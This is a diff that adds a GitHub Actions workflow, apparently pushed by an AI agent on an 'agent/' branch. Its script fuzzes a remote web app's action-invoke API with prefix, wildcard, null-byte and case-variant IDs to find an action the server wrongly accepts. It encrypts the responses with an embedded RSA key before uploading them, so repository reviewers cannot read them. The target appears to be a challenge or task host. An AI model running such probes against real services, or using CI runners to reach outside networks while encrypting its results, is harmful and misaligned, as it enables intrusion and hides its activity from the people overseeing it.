@@ -1,0 +1,53 @@
+name: launchlet-part3-actionprefix
+on:
+  push:
+    branches: [agent/launchlet-part3-actionprefix-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Probe action ID prefix/wildcard matching and encrypt responses
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
+          known='act_6f4b9a2c1d0e8a71';core=known[4:]
+          vals=['', 'act_', '6f4b9a2c1d0e8a71', core]
+          vals += ['act_'+core[:i] for i in range(1,len(core)+1)]
+          vals += [core[:i] for i in range(1,len(core)+1)]
+          vals += ['act_*','act_6*','act_6f4b*','*','inspectDeploy','act_inspectDeploy',known+'*',known+' ',' '+known,known+'\x00','ACT_'+core.upper(),known.upper()]
+          vals=list(dict.fromkeys(vals));h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board'}
+          args={'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'};res=[]
+          for aid in vals:
+            r=requests.post(base+'/api/actions/invoke',headers=h,json={'actionId':aid,'args':args},timeout=7)
+            item={'actionId':aid,'status':r.status_code,'body':r.text};res.append(item)
+            if aid!=known and not (r.status_code==404 and r.text=='{"error":"unknown_action"}'):
+              (out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-actionprefix-encrypted
+          path: artifact/
+          retention-days: 1
